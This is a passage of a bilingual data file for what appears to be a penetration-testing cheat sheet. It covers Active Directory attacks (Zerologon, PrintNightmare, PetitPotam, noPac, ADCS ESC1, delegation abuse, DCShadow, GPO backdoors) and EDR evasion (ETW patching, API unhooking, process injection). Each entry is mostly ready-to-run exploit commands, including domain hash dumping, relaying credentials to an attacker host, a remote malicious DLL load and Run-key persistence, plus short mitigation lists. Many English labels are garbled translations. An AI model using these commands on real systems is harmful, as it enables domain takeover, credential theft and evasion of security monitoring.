    prerequisites: [{ zh: '可访问域控制器RPC', en: 'CanAccessDomainControllerRPC' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: 'python zerologon_tester.py DC_NAME DC_IP\n检测是否存在漏洞',
        description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python zerologon_exploit.py DC_NAME DC_IP\n将DC密码置空',
        description: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'zerologon_exploit.py', explanation: { zh: '利用脚本', en: 'ExploitationScript' } , type: 'keyword' },
          { part: 'DC_NAME', explanation: { zh: '域控制器名称', en: 'Domain Controller Name' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '导出哈希', en: 'Exporthash' },
        command: 'secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME\$@DC_IP\n导出域内所有哈希',
        description: { zh: '导出哈希', en: 'Exporthash' },
        platform: 'linux'
      },
      {
        title: { zh: '恢复密码', en: 'RecoveryPassword' },
        command: 'python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM\n恢复域控密码避免破坏',
        description: { zh: '恢复密码', en: 'RecoveryPassword' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'Zerologon可重置域控制器密码为空。', en: 'ZerologonCanResetDomainControllerPassword is Empty.' },
      vulnerability: { zh: 'Netlogon协议加密缺陷。', en: 'The Netlogon protocol has an encryption flaw.' },
      exploitation: { zh: '利用流程：1) 检测漏洞 2) 重置密码 3) 导出哈希 4) 恢复密码', en: 'Exploitationworkflow: 1) DetectionVulnerability 2) ResetPassword 3) Exporthash 4) RecoveryPassword' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 强制安全RPC 3) 监控异常登录', en: 'Defenses: 1) Install patches 2) Enforce secure RPC 3) Monitor anomalous logins' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'printnightmare',
    name: { zh: 'PrintNightmare攻击', en: 'PrintNightmare Attack' },
    description: { zh: 'CVE-2021-34527 打印服务漏洞', en: 'CVE-2021-34527 Print Spooler Vulnerability' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'PrintNightmare',
    tags: ['printnightmare', 'cve-2021-34527', 'rce'],
    prerequisites: [{ zh: '可访问打印服务RPC', en: 'Can access Print Spooler RPC' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: 'rpcdump.py @DC_IP | grep MS-RPRN\n检查打印服务是否可用',
        description: { zh: '检测打印服务', en: 'Detect Print Spooler' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python CVE-2021-34527.py -target DC_IP -payload DLL_PATH\n加载恶意DLL获取SYSTEM权限',
        description: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-target', explanation: { zh: '目标IP', en: 'TargetIP' } , type: 'parameter' },
          { part: '-payload', explanation: { zh: '恶意DLL路径', en: 'MaliciousDLLPath' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Impacket利用', en: 'ImpacketExploitation' },
        command: 'python dementor.py -d domain -u user -p pass \\\\attacker\\share DC_IP\n触发加载远程DLL',
        description: { zh: '使用Impacket', en: 'UseImpacket' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'PrintNightmare可远程执行代码。', en: 'PrintNightmareCanRemote ExecutionCode.' },
      vulnerability: { zh: '打印服务存在远程代码执行漏洞。', en: 'The Print Spooler service has a remote code execution vulnerability.' },
      exploitation: { zh: '利用流程：1) 检测打印服务 2) 构造恶意DLL 3) 触发加载', en: 'Exploitation workflow: 1) Detect Print Spooler 2) Craft malicious DLL 3) Trigger loading' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 禁用打印服务 3) 网络隔离', en: 'Defenses: 1) Install patches 2) Disable Print Spooler 3) Network segmentation' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'petitpotam',
    name: { zh: 'PetitPotam攻击', en: 'PetitPotam Attack' },
    description: { zh: 'CVE-2021-36942 强制认证攻击', en: 'CVE-2021-36942 Coerced Authentication Attack' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'PetitPotam',
    tags: ['petitpotam', 'cve-2021-36942', 'relay'],
    prerequisites: [{ zh: '可访问EFSRPC接口', en: 'CanAccessEFSRPCInterface' }],
    execution: [
      {
        title: { zh: '启动中继', en: 'StartRelay' },
        command: 'python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs\n设置NTLM中继到ADCS',
        description: { zh: '启动NTLM中继', en: 'Launch NTLM Relay' },
        platform: 'linux'
      },
      {
        title: { zh: '触发认证', en: 'TriggerAuthentication' },
        command: 'python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP\n强制DC向攻击者认证',
        description: { zh: '触发认证', en: 'TriggerAuthentication' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'petitpotam.py', explanation: { zh: 'PetitPotam利用脚本', en: 'PetitPotamExploitationScript' } , type: 'keyword' },
          { part: 'attacker_ip', explanation: { zh: '中继服务器IP', en: 'RelayServerIP' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '获取证书', en: 'ObtainCertificate' },
        command: '中继成功后获取用户证书\n使用证书进行Pass-the-Cert',
        description: { zh: '获取证书', en: 'ObtainCertificate' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'PetitPotam可强制机器账户认证。', en: 'PetitPotam can coerce machine account authentication.' },
      vulnerability: { zh: 'EFSRPC接口可被滥用。', en: 'The EFSRPC interface can be abused.' },
      exploitation: { zh: '利用流程：1) 启动中继 2) 触发认证 3) 中继到ADCS', en: 'Exploitationworkflow: 1) StartRelay 2) TriggerAuthentication 3) Relay to ADCS' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 禁用EFSRPC 3) 保护ADCS', en: 'Defenses: 1) Install patches 2) Disable EFSRPC 3) Protect ADCS' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'samaccountname',
    name: { zh: 'noPac/SAMAccountName攻击', en: 'noPac/SAMAccountName Attack' },
    description: { zh: 'CVE-2021-42278/CVE-2021-42287 域提权', en: 'CVE-2021-42278/CVE-2021-42287 DomainPrivilege escalation' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'noPac',
    tags: ['nopac', 'cve-2021-42278', 'privesc'],
    prerequisites: [{ zh: '普通域用户权限', en: 'Standard Domain User Privileges' }],
    execution: [
      {
        title: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        command: 'python noPac.py domain/user:password -dc-ip DC_IP -debug\n检测是否存在漏洞',
        description: { zh: '检测漏洞', en: 'DetectionVulnerability' },
        platform: 'linux'
      },
      {
        title: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        command: 'python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell\n获取域管权限',
        description: { zh: '利用漏洞', en: 'ExploitationVulnerability' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-dc-ip', explanation: { zh: '域控制器IP', en: 'DomainControllerIP' } , type: 'parameter' },
          { part: '-shell', explanation: { zh: '获取Shell', en: 'Get Shell' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '攻击原理', en: 'AttackPrinciple' },
        command: '1. 创建机器账户(名称类似DC)\n2. 清除SPN\n3. 请求TGT\n4. 删除机器账户\n5. 获取域管TGT',
        description: { zh: '攻击原理', en: 'AttackPrinciple' },
        platform: 'all'
      }
    ],
    tutorial: {
      overview: { zh: 'noPac可从普通用户提权到域管理员。', en: 'noPac can escalate from a standard user to Domain Admin.' },
      vulnerability: { zh: 'SAM-Account-Name欺骗和PAC验证缺陷。', en: 'SAM-Account-Name spoofing and PAC verification flaw.' },
      exploitation: { zh: '利用流程：1) 创建机器账户 2) 清除SPN 3) 获取域管TGT', en: 'Exploitationworkflow: 1) CreateMachineAccount 2) ClearSPN 3) Get Domain AdminsTGT' },
      mitigation: { zh: '防御措施：1) 安装补丁 2) 限制机器账户创建 3) 监控异常账户', en: 'Defensemeasures: 1) InstallationPatch 2) RestrictMachineAccountCreate 3) MonitoringExceptionAccount' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-abuse',
    name: { zh: 'ADCS滥用攻击', en: 'ADCS Abuse Attack' },
    description: { zh: 'Active Directory证书服务滥用', en: 'Active Directory Certificate Services Abuse' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'ADCS',
    tags: ['adcs', 'certificate', 'domain'],
    prerequisites: [{ zh: 'ADCS服务可访问', en: 'ADCSServiceCanAccess' }],
    execution: [
      {
        title: { zh: '枚举ADCS', en: 'Enumerate ADCS' },
        command: 'certipy find -u user@domain -p password -dc-ip DC_IP\n枚举证书模板',
        description: { zh: '枚举ADCS配置', en: 'Enumerate ADCSConfiguration' },
        platform: 'linux'
      },
      {
        title: { zh: '请求用户证书', en: 'RequestUsersCertificate' },
        command: 'certipy req -u user@domain -p password -ca CA_NAME -template User\n请求用户证书',
        description: { zh: '请求证书', en: 'RequestCertificate' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'certipy req', explanation: { zh: '请求证书命令', en: 'RequestCertificateCommand' } , type: 'keyword' },
          { part: '-ca', explanation: { zh: '证书颁发机构', en: 'Certificate Authority' } , type: 'parameter' },
          { part: '-template', explanation: { zh: '证书模板', en: 'CertificateTemplate' } , type: 'parameter' }
        ]
      },
      {
        title: 'Pass-the-Cert',
        command: 'certipy auth -pfx user.pfx -dc-ip DC_IP\n使用证书获取TGT',
        description: { zh: '使用证书认证', en: 'UseCertificate Authentication' },
        platform: 'linux'
      },
      {
        title: { zh: 'Rubeus请求', en: 'RubeusRequest' },
        command: 'Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt\n使用Rubeus请求TGT',
        description: { zh: 'Rubeus利用', en: 'RubeusExploitation' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'ADCS可被滥用获取用户证书进行认证。', en: 'ADCS can be abused to obtain user certificates for authentication.' },
      vulnerability: { zh: '证书模板配置不当。', en: 'Certificate template misconfiguration.' },
      exploitation: { zh: '利用流程：1) 枚举ADCS 2) 请求证书 3) Pass-the-Cert', en: 'Exploitationworkflow: 1) Enumerate ADCS 2) RequestCertificate 3) Pass-the-Cert' },
      mitigation: { zh: '防御措施：1) 审计证书模板 2) 限制模板权限 3) 监控证书请求', en: 'Defensemeasures: 1) AuditCertificateTemplate 2) RestrictTemplatePermission 3) MonitoringCertificateRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'adcs-esc1',
    name: { zh: 'ADCS ESC1漏洞', en: 'ADCS ESC1 Vulnerability' },
    description: { zh: '证书模板ESC1滥用', en: 'Certificate Template ESC1 Abuse' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'ADCS',
    tags: ['adcs', 'esc1', 'certificate'],
    prerequisites: [{ zh: '存在ESC1配置的模板', en: 'hasESC1Configuration Template' }],
    execution: [
      {
        title: { zh: '识别ESC1', en: 'IdentifyESC1' },
        command: 'certipy find -u user@domain -p password -vulnerable\n查找ESC1漏洞模板',
        description: { zh: '识别漏洞模板', en: 'IdentifyVulnerabilityTemplate' },
        platform: 'linux'
      },
      {
        title: { zh: '利用ESC1', en: 'ExploitationESC1' },
        command: 'certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain\n指定SAN为域管',
        description: { zh: '请求域管证书', en: 'Request Domain Admin Certificate' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-alt', explanation: { zh: '指定Subject Alternative Name', en: 'specifiedSubject Alternative Name' } , type: 'parameter' },
          { part: 'admin@domain', explanation: { zh: '目标用户UPN', en: 'TargetUsersUPN' } , type: 'value' }
        ]
      },
      {
        title: { zh: '认证为域管', en: 'Authenticate as Domain Admin' },
        command: 'certipy auth -pfx admin.pfx -dc-ip DC_IP\n使用证书认证为域管',
        description: { zh: '认证为域管', en: 'Authenticate as Domain Admin' },
        platform: 'linux'
      }
    ],
    tutorial: {
      overview: { zh: 'ESC1允许在证书请求中指定任意SAN。', en: 'ESC1Allow in CertificateRequestMiddlespecifiedArbitrarySAN.' },
      vulnerability: { zh: '模板允许用户指定SAN且可用于客户端认证。', en: 'The template allows users to specify a SAN and can be used for client authentication.' },
      exploitation: { zh: '利用流程：1) 找到ESC1模板 2) 指定域管SAN 3) 获取域管证书', en: 'Exploitation workflow: 1) Find an ESC1-vulnerable template 2) Specify Domain Admin SAN 3) Obtain Domain Admin certificate' },
      mitigation: { zh: '防御措施：1) 禁用SAN指定 2) 限制模板权限 3) 监控证书请求', en: 'Defensemeasures: 1) DisableSANspecified 2) RestrictTemplatePermission 3) MonitoringCertificateRequest' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'constrained-delegation',
    name: { zh: '约束委派攻击', en: 'Constrained Delegation Attack' },
    description: { zh: '利用约束委派进行横向移动', en: 'Exploit Constrained Delegation for Lateral Movement' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: { zh: '委派攻击', en: 'Delegation Attack' },
    tags: ['delegation', 'constrained', 'kerberos'],
    prerequisites: [{ zh: '存在约束委派配置的账户', en: 'Account with constrained delegation configured' }],
    execution: [
      {
        title: { zh: '查找约束委派', en: 'Find Constrained Delegation' },
        command: 'Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation\n或\nbloodhound查询',
        description: { zh: '查找约束委派账户', en: 'Find Constrained Delegation Accounts' },
        platform: 'windows'
      },
      {
        title: { zh: '获取服务票据', en: 'Get ServicesTicket' },
        command: 'Rubeus.exe s4u /user:SERVICE_ACCOUNT$ /rc4:HASH /msdsspn:CIFS/target.domain.com /impersonateuser:Administrator\n获取域管的服务票据',
        description: 'S4U2Self + S4U2Proxy',
        platform: 'windows',
        syntaxBreakdown: [
          { part: 's4u', explanation: { zh: 'S4U扩展', en: 'S4UExtension' } , type: 'keyword' },
          { part: '/impersonateuser', explanation: { zh: '模拟的用户', en: 'Impersonated User' } , type: 'parameter' },
          { part: '/msdsspn', explanation: { zh: '目标服务SPN', en: 'TargetServiceSPN' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '使用票据', en: 'UseTicket' },
        command: 'Rubeus.exe ptt /ticket:BASE64_TICKET\n注入票据并访问服务',
        description: { zh: '注入票据', en: 'InjectionTicket' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '约束委派允许账户模拟用户访问特定服务。', en: 'Constrained delegation allows an account to impersonate users to access specific services.' },
      vulnerability: { zh: '约束委派配置可被滥用。', en: 'Constrained delegation configurations can be abused.' },
      exploitation: { zh: '利用流程：1) 找到委派账户 2) S4U获取票据 3) 访问目标服务', en: 'Exploitation workflow: 1) Find delegation account 2) Obtain ticket via S4U 3) Access target service' },
      mitigation: { zh: '防御措施：1) 审计委派配置 2) 使用受保护用户组 3) 监控S4U请求', en: 'Defenses: 1) Audit delegation configurations 2) Use Protected Users group 3) Monitor S4U requests' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'resource-delegation',
    name: { zh: '基于资源的约束委派', en: 'Resource-Based Constrained Delegation' },
    description: { zh: '利用RBCD进行权限提升', en: 'ExploitationRBCD perform Privilege Escalation' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: { zh: '委派攻击', en: 'Delegation Attack' },
    tags: ['rbcd', 'delegation', 'kerberos'],
    prerequisites: [{ zh: '对目标对象有WriteDACL权限', en: 'for Target for Object has WriteDACLPermission' }],
    execution: [
      {
        title: { zh: '创建机器账户', en: 'CreateMachineAccount' },
        command: 'New-MachineAccount -MachineAccount FAKECOMPUTER -Password $(ConvertTo-SecureString "password" -AsPlainText -Force)\n创建新的机器账户',
        description: { zh: '创建机器账户', en: 'CreateMachineAccount' },
        platform: 'windows'
      },
      {
        title: { zh: '配置RBCD', en: 'ConfigurationRBCD' },
        command: 'Set-ADComputer -Identity TARGET_COMPUTER -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$\n设置委派关系',
        description: { zh: '配置RBCD', en: 'ConfigurationRBCD' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'PrincipalsAllowedToDelegateToAccount', explanation: { zh: '允许委派的账户', en: 'Delegation-Enabled Account' } , type: 'keyword' }
        ]
      },
      {
        title: { zh: '利用RBCD', en: 'ExploitationRBCD' },
        command: 'Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:CIFS/target.domain.com\n获取域管票据',
        description: { zh: '利用RBCD', en: 'ExploitationRBCD' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'RBCD允许从目标对象配置委派关系。', en: 'RBCD allows configuring delegation relationships from the target object.' },
      vulnerability: { zh: '对对象有WriteDACL权限可配置RBCD。', en: 'for for Object has WriteDACLPermissionCanConfigurationRBCD.' },
      exploitation: { zh: '利用流程：1) 创建机器账户 2) 配置RBCD 3) 获取高权限票据', en: 'Exploitationworkflow: 1) CreateMachineAccount 2) ConfigurationRBCD 3) ObtainHighPermissionTicket' },
      mitigation: { zh: '防御措施：1) 审计ACL权限 2) 保护关键对象 3) 监控RBCD配置', en: 'Defenses: 1) Audit ACL permissions 2) Protect critical objects 3) Monitor RBCD configurations' },
      difficulty: 'expert'
    }
  },
  {
    id: 'dcshadow-attack',
    name: { zh: 'DCShadow攻击', en: 'DCShadow Attack' },
    description: { zh: '伪造域控制器注入数据', en: 'ForgeDomainControllerInjectionData' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: 'DCShadow',
    tags: ['dcshadow', 'domain', 'injection'],
    prerequisites: [{ zh: '域管理员权限', en: 'Domain AdminsPermission' }, { zh: '可注册新DC', en: 'Can register a new DC' }],
    execution: [
      {
        title: { zh: '注册伪造DC', en: 'RegisterForgeDC' },
        command: 'mimikatz # lsadump::dcshadow /object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519\n注册伪造DC并修改对象属性',
        description: { zh: '注册伪造DC', en: 'RegisterForgeDC' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'lsadump::dcshadow', explanation: { zh: 'DCShadow模块', en: 'DCShadowModule' } , type: 'command' },
          { part: '/object', explanation: { zh: '目标对象DN', en: 'Target for ObjectDN' } , type: 'parameter' },
          { part: '/attribute', explanation: { zh: '要修改的属性', en: 'NeedModify property' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '推送更改', en: 'Push changes' },
        command: '在另一个终端:\nmimikatz # lsadump::dcshadow /push\n推送更改到真实DC',
        description: { zh: '推送更改', en: 'Push changes' },
        platform: 'windows'
      },
      {
        title: { zh: '常见利用', en: 'commonExploitation' },
        command: '修改用户组:\n/object:CN=Target,CN=Users,DC=domain,DC=com /attribute:primaryGroupID /value:519\n添加SID History:\n/attribute:sidHistory /value:S-1-5-21-xxx-500',
        description: { zh: '常见利用场景', en: 'commonExploitationScenario' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'DCShadow可伪造DC向真实DC注入数据。', en: 'DCShadow can forge a DC and inject data into the real DC.' },
      vulnerability: { zh: 'AD复制机制可被滥用。', en: 'The AD replication mechanism can be abused.' },
      exploitation: { zh: '利用流程：1) 获取域管权限 2) 注册伪造DC 3) 推送恶意数据', en: 'Exploitation workflow: 1) Obtain Domain Admin privileges 2) Register a fake DC 3) Push malicious data' },
      mitigation: { zh: '防御措施：1) 监控DC注册 2) 审计复制事件 3) 保护域管账户', en: 'Defenses: 1) Monitor DC registrations 2) Audit replication events 3) Protect Domain Admin accounts' },
      difficulty: 'expert'
    }
  },
  {
    id: 'group-policy-abuse',
    name: { zh: '组策略滥用', en: 'Group Policy Abuse' },
    description: { zh: '滥用组策略进行横向移动', en: 'Abuse Group Policy for Lateral Movement' },
    category: { zh: '域渗透攻击', en: 'Active Directory Attacks' },
    subCategory: { zh: '组策略', en: 'Group Policy' },
    tags: ['gpo', 'group-policy', 'domain'],
    prerequisites: [{ zh: 'GPO编辑权限', en: 'GPO Edit Permissions' }],
    execution: [
      {
        title: { zh: '查找可编辑GPO', en: 'Find Editable GPOs' },
        command: 'Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }\n查找Domain Users可编辑的GPO',
        description: { zh: '查找可编辑GPO', en: 'Find Editable GPOs' },
        platform: 'windows'
      },
      {
        title: { zh: '添加计划任务', en: 'Add Scheduled Task' },
        command: 'New-GPOImmediateTask -TaskName "Backdoor" -Command "cmd.exe" -Arguments "/c calc.exe" -GPODisplayName "VULN_GPO"\n添加立即执行的计划任务',
        description: { zh: '添加计划任务', en: 'Add Scheduled Task' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'New-GPOImmediateTask', explanation: { zh: '创建立即任务', en: 'Create Immediate Task' } , type: 'keyword' },
          { part: '-GPODisplayName', explanation: { zh: '目标GPO名称', en: 'Target GPO Name' } , type: 'parameter' }
        ]
      },
      {
        title: { zh: '添加注册表项', en: 'AddRegistryitem' },
        command: 'Set-GPPrefRegistryValue -Name "VULN_GPO" -Context Computer -Action Create -Key "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -ValueName "Backdoor" -Value "C:\\backdoor.exe"',
        description: { zh: '添加注册表启动项', en: 'AddRegistryStartitem' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '组策略可被滥用在目标机器执行代码。', en: 'Group Policy can be abused to execute code on target machines.' },
      vulnerability: { zh: '用户对GPO有编辑权限。', en: 'The user has edit permissions on the GPO.' },
      exploitation: { zh: '利用流程：1) 找到可编辑GPO 2) 添加恶意配置 3) 等待应用', en: 'Exploitation workflow: 1) Find editable GPOs 2) Add malicious configuration 3) Wait for application' },
      mitigation: { zh: '防御措施：1) 审计GPO权限 2) 监控GPO变更 3) 限制编辑权限', en: 'Defenses: 1) Audit GPO permissions 2) Monitor GPO changes 3) Restrict edit permissions' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'etw-patch',
    name: { zh: 'ETW Patch绕过', en: 'ETW Patch Bypass' },
    description: { zh: '禁用ETW监控', en: 'DisableETWMonitoring' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: 'ETW',
    tags: ['etw', 'bypass', 'evasion'],
    prerequisites: [{ zh: '代码执行权限', en: 'CodeExecutePermission' }],
    execution: [
      {
        title: { zh: 'PowerShell禁用ETW', en: 'PowerShellDisableETW' },
        command: '[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)\n或\n[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null\n$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())\n$etw.SetEnabled(0)',
        description: { zh: 'PowerShell禁用ETW', en: 'PowerShellDisableETW' },
        platform: 'windows'
      },
      {
        title: { zh: 'C#禁用ETW', en: 'C#DisableETW' },
        command: 'Assembly.Load("System.Diagnostics.Tracing")\nType etwType = typeof(EventProvider)\nMethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)\nsetEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })',
        description: { zh: 'C#禁用ETW', en: 'C#DisableETW' },
        platform: 'windows'
      },
      {
        title: { zh: '修补ntdll', en: 'Patch ntdll' },
        command: '$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")\n$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")\n[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)\n[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)',
        description: { zh: '修补EtwEventWrite', en: 'Patch EtwEventWrite' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'EtwEventWrite', explanation: { zh: 'ETW写入函数', en: 'ETWWriteFunction' } , type: 'keyword' },
          { part: '0xC3', explanation: { zh: 'RET指令', en: 'RET Instruction' } , type: 'keyword' }
        ]
      }
    ],
    tutorial: {
      overview: { zh: 'ETW是Windows的重要监控机制。', en: 'ETW is Windows ImportantMonitoringMechanism.' },
      vulnerability: { zh: 'ETW可被用户模式程序禁用。', en: 'ETWCan by UsersModeProgramDisable.' },
      exploitation: { zh: '利用流程：1) 加载ETW程序集 2) 调用禁用方法 3) 或修补函数', en: 'Exploitation workflow: 1) Load ETW assembly 2) Call disable method 3) Or patch the function' },
      mitigation: { zh: '防御措施：1) 使用内核级监控 2) 监控ETW禁用 3) 使用EDR', en: 'Defenses: 1) Use kernel-level monitoring 2) Monitor ETW disabling 3) Use EDR' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'api-unhooking',
    name: 'API Unhooking',
    description: { zh: '移除EDR的API Hook', en: 'RemoveEDR API Hook' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: 'Unhooking',
    tags: ['unhooking', 'hook', 'evasion'],
    prerequisites: [{ zh: '代码执行权限', en: 'CodeExecutePermission' }],
    execution: [
      {
        title: { zh: '从磁盘还原', en: 'from Disk also Original' },
        command: '$ntdll = [System.IO.File]::ReadAllBytes("C:\\Windows\\System32\\ntdll.dll")\n$proc = [System.Diagnostics.Process]::GetCurrentProcess()\n$base = $proc.MainModule.BaseAddress\n# 找到.text段并覆盖',
        description: { zh: '从磁盘读取干净DLL', en: 'Read Clean DLL from Disk' },
        platform: 'windows'
      },
      {
        title: { zh: '从KnownDlls还原', en: 'from KnownDlls also Original' },
        command: '$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\\KnownDlls\\ntdll.dll")\n$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)\n# 复制干净的代码段',
        description: { zh: '从KnownDlls还原', en: 'from KnownDlls also Original' },
        platform: 'windows'
      },
      {
        title: 'Hell\'s Gate',
        command: '通过系统调用号直接调用:\n1. 解析NTDLL获取系统调用号\n2. 直接执行syscall\n3. 绕过用户模式Hook',
        description: { zh: 'Hell\'s Gate技术', en: 'Hell\'s GateTechnique' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: 'EDR通过Hook API监控程序行为。', en: 'EDRthroughHook APIMonitoringProgrambehavior.' },
      vulnerability: { zh: '用户模式Hook可被移除。', en: 'UsersModeHookCan by Remove.' },
      exploitation: { zh: '利用流程：1) 读取干净DLL 2) 覆盖Hook代码 3) 恢复原始API', en: 'Exploitation workflow: 1) Read clean DLL 2) Overwrite hook code 3) Restore original API' },
      mitigation: { zh: '防御措施：1) 内核级监控 2) 检测Unhooking 3) 多层防护', en: 'Defenses: 1) Kernel-level monitoring 2) Detect unhooking 3) Defense in depth' },
      difficulty: 'expert'
    }
  },
  {
    id: 'process-injection',
    name: { zh: '进程注入', en: 'Process Injection' },
    description: { zh: '将代码注入到其他进程', en: 'will CodeInjection to otherProcess' },
    category: { zh: '免杀与规避', en: 'Evasion & Anti-Detection' },
    subCategory: { zh: '进程注入', en: 'Process Injection' },
    tags: ['injection', 'process', 'evasion'],
    prerequisites: [{ zh: '代码执行权限', en: 'CodeExecutePermission' }],
    execution: [
      {
        title: { zh: '经典DLL注入', en: 'Classic DLL Injection' },
        command: '$proc = Get-Process -Name notepad\n$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)\n$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)\n[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)\n[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)',
        description: { zh: 'DLL注入', en: 'DLL Injection' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'VirtualAllocEx', explanation: { zh: '在目标进程分配内存', en: 'Allocate Memory in Target Process' } , type: 'keyword' },
          { part: 'WriteProcessMemory', explanation: { zh: '写入DLL路径', en: 'WriteDLLPath' } , type: 'keyword' },
          { part: 'CreateRemoteThread', explanation: { zh: '创建远程线程', en: 'CreateRemotethread' } , type: 'keyword' }
        ]
      },
      {
        title: 'Process Hollowing',
        command: '1. CreateProcess(CREATE_SUSPENDED)\n2. NtUnmapViewOfSection\n3. VirtualAllocEx\n4. WriteProcessMemory\n5. ResumeThread',
        description: { zh: '进程镂空', en: 'Process Hollowing' },
        platform: 'windows'
      },
      {
        title: { zh: 'APC注入', en: 'APCInjection' },
        command: '$threadId = $proc.Threads[0].Id\n$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")\n[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)',
        description: { zh: 'APC队列注入', en: 'APCqueueInjection' },
        platform: 'windows'
      }
    ],
    tutorial: {
      overview: { zh: '进程注入将代码注入合法进程执行。', en: 'Process Injection will CodeInjectionLegitimateProcessExecute.' },
      vulnerability: { zh: 'Windows进程API可被滥用。', en: 'Windows process APIs can be abused.' },
      exploitation: { zh: '利用流程：1) 打开目标进程 2) 分配内存 3) 写入代码 4) 执行', en: 'Exploitation workflow: 1) Open target process 2) Allocate memory 3) Write code 4) Execute' },
      mitigation: { zh: '防御措施：1) 使用EDR 2) 监控进程注入 3) 启用保护机制', en: 'Defenses: 1) Use EDR 2) Monitor process injection 3) Enable protection mechanisms' },
      difficulty: 'advanced'
    }
  },
  {
